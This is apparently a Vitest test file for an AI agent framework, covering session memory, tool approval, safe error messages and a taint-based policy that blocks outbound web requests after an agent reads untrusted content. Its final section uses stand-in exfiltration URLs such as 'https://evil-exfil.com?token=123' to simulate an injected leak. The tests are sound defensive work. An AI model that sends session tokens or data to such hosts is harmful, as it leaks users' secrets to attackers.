import { afterEach, describe, expect, it, vi } from 'vitest';
import { mkdtempSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { Agent, SqliteMemory, decide, Grants } from '../packages/core/dist/index.js';
import type { ModelProvider, ModelResponse } from '../packages/models/dist/types.js';
import type { AgentTool } from '../packages/tools/dist/index.js';
const resources: Array<() => void> = [];
afterEach(() => { resources.reverse().forEach(close => close()); resources.length = 0; });
function memory() { const m = new SqliteMemory(':memory:'); resources.push(() => m.close()); return m; }
function model(...responses: ModelResponse[]) {
  const complete = vi.fn<ModelProvider['complete']>();
  responses.forEach(response => complete.mockResolvedValueOnce(response));
  return { complete };
}
const answer = (text = 'done'): ModelResponse => ({ text, toolCalls: [] });
const call: ModelResponse = { text: '', toolCalls: [{ id: 'call-1', name: 'action', input: { value: 'x' } }] };
function tool(requiresApproval = false): AgentTool {
  return { name: 'action', description: 'Test action', requiresApproval, inputSchema: { type: 'object', properties: { value: { type: 'string' } }, required: ['value'], additionalProperties: false }, execute: vi.fn(async () => 'result') };
}
describe('SQLite memory', () => {
  it('persists full tool turns and state across reopen; isolates and clears sessions', () => {
    const directory = mkdtempSync(join(tmpdir(), 'yusufclaw-'));
    resources.push(() => rmSync(directory, { recursive: true, force: true }));
    const path = join(directory, 'memory.sqlite');
    let db = new SqliteMemory(path);
    const messages = [{ role: 'user' as const, text: "quote ' and unicode ı" }, { role: 'assistant' as const, text: 'reply' }];
    db.save('a', '1', messages, 'reply'); db.setState('offset', '42'); db.close();
    db = new SqliteMemory(path); resources.push(() => db.close());
    expect(db.history('a')).toEqual(messages); expect(db.history('b')).toEqual([]);
    expect(db.reply('a', '1')).toBe('reply'); expect(db.getState('offset')).toBe('42');
    db.save('a', '2', [{ role: 'user', text: 'recent' }], 'new');
    expect(db.history('a', 1)).toEqual([{ role: 'user', text: 'recent' }]);
    db.clear('a'); expect(db.history('a')).toEqual([]);
  });
});
describe('agent loop', () => {
  it('executes tool calls, sends results back, and remembers complete turns', async () => {
    const provider = model(call, answer(), answer('next'));
    const action = tool(); const db = memory(); const agent = new Agent(provider, db, [action]);
    expect(await agent.handle('s', '1', 'hello')).toBe('done');
    expect(action.execute).toHaveBeenCalledWith({ value: 'x' }, undefined);
    expect(provider.complete.mock.calls[1][0].messages.at(-1)).toMatchObject({ role: 'tool', callId: 'call-1', text: 'result', error: false });
    await agent.handle('s', '2', 'next');
    expect(provider.complete.mock.calls[2][0].messages).toHaveLength(5);
    expect(await agent.handle('s', '2', 'next')).toBe('next');
    expect(provider.complete).toHaveBeenCalledTimes(3);
  });
  it.each([undefined, false, true])('requires explicit approval (%s)', async approved => {
    const action = tool(true); const provider = model(call, answer());
    const approve = approved === undefined ? undefined : vi.fn(async () => approved);
    await new Agent(provider, memory(), [action]).handle('s', '1', 'run', approve);
    expect(action.execute).toHaveBeenCalledTimes(approved === true ? 1 : 0);
    expect(provider.complete.mock.calls[1][0].messages.at(-1)).toMatchObject({ error: approved !== true });
  });
  it.each(['unknown', 'invalid', 'exception'])('returns safe tool errors: %s', async kind => {
    const action = tool();
    if (kind === 'exception') action.execute = vi.fn(async () => { throw new Error('SECRET'); });
    const response = structuredClone(call);
    if (kind === 'unknown') response.toolCalls[0].name = 'missing';
    if (kind === 'invalid') response.toolCalls[0].input = { value: 42 };
    const provider = model(response, answer());
    await new Agent(provider, memory(), [action]).handle('s', '1', 'run');
    const result = provider.complete.mock.calls[1][0].messages.at(-1);
    expect(result).toMatchObject({ error: true }); expect(JSON.stringify(result)).not.toContain('SECRET');
    if (kind !== 'exception') expect(action.execute).not.toHaveBeenCalled();
  });
  it('bounds repeated tools and does not save incomplete turns', async () => {
    const db = memory(); const action = tool(); const provider = model(call, { ...call, toolCalls: [{ ...call.toolCalls[0], id: 'call-2' }] });
    await expect(new Agent(provider, db, [action], { maxSteps: 2 }).handle('s', '1', 'run')).rejects.toThrow('step limit');
    expect(action.execute).toHaveBeenCalledTimes(1); expect(db.history('s')).toEqual([]);
  });
  it('rejects duplicate call IDs and excessive tool batches', async () => {
    const action = tool();
    const duplicate = { text: '', toolCalls: [call.toolCalls[0], call.toolCalls[0]] };
    await expect(new Agent(model(duplicate), memory(), [action]).handle('s', '1', 'run')).rejects.toThrow('Duplicate');
    const excessive = { text: '', toolCalls: Array.from({ length: 17 }, () => call.toolCalls[0]) };
    await expect(new Agent(model(excessive), memory(), [action]).handle('s', '1', 'run')).rejects.toThrow('Too many');
  });
  it('serializes concurrent session turns and recovers after provider failure', async () => {
    const provider = model(answer('a'), answer('b'));
    const db = memory(); const agent = new Agent(provider, db);
    await Promise.all([agent.handle('s', '1', 'first'), agent.handle('s', '2', 'second')]);
    expect(provider.complete.mock.calls[1][0].messages).toHaveLength(3);
    provider.complete.mockRejectedValueOnce(new Error('offline'));
    await expect(agent.handle('s', '3', 'fail')).rejects.toThrow('offline');
    expect(db.history('s')).toHaveLength(4);
    provider.complete.mockResolvedValueOnce(answer('recovered'));
    expect(await agent.handle('s', '4', 'retry')).toBe('recovered');
  });
  it('handles reset/help locally and rejects blank, oversized and aborted requests', async () => {
    const provider = model(answer()); const db = memory(); const agent = new Agent(provider, db);
    await agent.handle('s', '1', 'hello'); await agent.handle('s', '2', '/reset');
    expect(db.history('s')).toEqual([]); expect(await agent.handle('s', '3', '/help')).toContain('/reset');
    expect(provider.complete).toHaveBeenCalledTimes(1);
    await expect(agent.handle('s', '4', ' ')).rejects.toThrow('characters');
    await expect(agent.handle('s', '5', 'x'.repeat(16001))).rejects.toThrow('characters');
    await expect(agent.handle('s', '6', 'hello', undefined, AbortSignal.abort())).rejects.toThrow();
  });
});

describe('YC-03: ToolManifest, deterministic policy.decide(), and session taint', () => {
  it('allows web_fetch in clean session, but requires action card once contaminated', () => {
    const webManifest = {
      id: 'web_fetch',
      version: '1.0.0',
      source: 'builtin' as const,
      effects: ['read_untrusted' as const, 'egress' as const]
    };

    // Clean session: decide returns allow
    const cleanTaint = { contaminated: false, sources: [] };
    const cleanDecision = decide(
      webManifest,
      { v: { url: 'https://example.com' }, labels: [{ origin: 'agent', integrity: 'trusted', secrecy: 'public' }] },
      cleanTaint
    );
    expect(cleanDecision.kind).toBe('allow');

    // Contaminated session: decide returns card per acceptance criteria
    const dirtyTaint = { contaminated: true, sources: ['web_fetch'] };
    const dirtyDecision = decide(
      webManifest,
      { v: { url: 'https://attacker.com/leak' }, labels: [{ origin: 'agent', integrity: 'untrusted', secrecy: 'public' }] },
      dirtyTaint
    );
    expect(dirtyDecision.kind).toBe('card');
    if (dirtyDecision.kind === 'card') {
      expect(dirtyDecision.card.rendered.title).toBe('Fetch External Web URL');
      expect(dirtyDecision.card.rendered.exact).toBe('https://attacker.com/leak');
      expect(dirtyDecision.card.rendered.taint).toBe('contaminated');
      expect(dirtyDecision.card.rendered.effects).toContain('egress');
    }
  });

  it('denies egress of secret-labeled values', () => {
    const webManifest = {
      id: 'web_fetch',
      version: '1.0.0',
      source: 'builtin' as const,
      effects: ['egress' as const]
    };
    const decision = decide(
      webManifest,
      { v: { url: 'https://leak.com' }, labels: [{ origin: 'env', integrity: 'trusted', secrecy: 'secret' }] },
      { contaminated: false, sources: [] }
    );
    expect(decision).toEqual({ kind: 'deny', reason: 'secret-egress' });
  });

  it('denies tools not covered by grants', () => {
    const shellManifest = {
      id: 'shell',
      version: '1.0.0',
      source: 'builtin' as const,
      effects: ['exec' as const]
    };
    const restrictedGrants = new Grants({ allowedTools: new Set(['file_read']) });
    const decision = decide(
      shellManifest,
      { v: { command: 'pwd' }, labels: [] },
      { contaminated: false, sources: [] },
      restrictedGrants
    );
    expect(decision).toEqual({ kind: 'deny', reason: 'grant' });
  });

  it('in Agent loop: Kirli oturumda web_fetch dış hosta kartsız çıkamaz', async () => {
    const fetchTool: AgentTool = {
      name: 'web_fetch',
      description: 'Fetch web page',
      manifest: {
        id: 'web_fetch',
        version: '1.0.0',
        source: 'builtin',
        effects: ['read_untrusted', 'egress']
      },
      inputSchema: {
        type: 'object',
        properties: { url: { type: 'string' } },
        required: ['url'],
        additionalProperties: false
      },
      requiresApproval: false,
      execute: vi.fn(async ({ url }) => `fetched: ${url}`)
    };

    const call1: ModelResponse = {
      text: '',
      toolCalls: [{ id: 'call-1', name: 'web_fetch', input: { url: 'https://news.ycombinator.com' } }]
    };
    const call2: ModelResponse = {
      text: '',
      toolCalls: [{ id: 'call-2', name: 'web_fetch', input: { url: 'https://evil-exfil.com?token=123' } }]
    };

    const provider = {
      complete: vi.fn<ModelProvider['complete']>()
        .mockResolvedValueOnce(call1)
        .mockResolvedValueOnce(answer('done 1'))
        .mockResolvedValueOnce(call2)
        .mockResolvedValueOnce(answer('done 2'))
    };

    const db = memory();
    const agent = new Agent(provider, db, [fetchTool]);

    // Step 1: In a clean session, web_fetch executes without card/approval
    const res1 = await agent.handle('session-sec', 'req-1', 'read news');
    expect(res1).toBe('done 1');
    expect(fetchTool.execute).toHaveBeenCalledTimes(1);

    // Session is now contaminated by read_untrusted!
    expect(agent.getTaint('session-sec').contaminated).toBe(true);

    // Step 2: Now in contaminated session, web_fetch attempts external egress without card approval -> DENIED
    const res2 = await agent.handle('session-sec', 'req-2', 'send data');
    expect(res2).toBe('done 2');
    // The tool call resulted in Tool approval denied error in turn history!
    expect(provider.complete.mock.calls[3][0].messages.at(-1)).toMatchObject({
      role: 'tool',
      callId: 'call-2',
      error: true,
      text: 'Tool approval denied'
    });
    // execute was NOT called a second time
    expect(fetchTool.execute).toHaveBeenCalledTimes(1);

    // Step 3: Now with approved card callback, it executes
    provider.complete
      .mockResolvedValueOnce(call2)
      .mockResolvedValueOnce(answer('approved done'));

    const approveCb = vi.fn(async (_call, card) => {
      expect(card).toBeDefined();
      expect(card.rendered.taint).toBe('contaminated');
      return true;
    });

    const res3 = await agent.handle('session-sec', 'req-3', 'send data with approval', approveCb);
    expect(res3).toBe('approved done');
    expect(approveCb).toHaveBeenCalledTimes(1);
    expect(fetchTool.execute).toHaveBeenCalledTimes(2);
  });
});

